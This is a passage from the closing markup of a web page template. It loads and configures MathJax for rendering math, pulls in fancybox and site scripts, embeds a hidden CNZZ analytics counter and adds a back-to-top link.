        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>
<script src="/js/bootstrap.js"></script>
<script src="/js/main.js"></script>







  <div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>








  </div>

  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js" async=""></script>
</body>
</html>
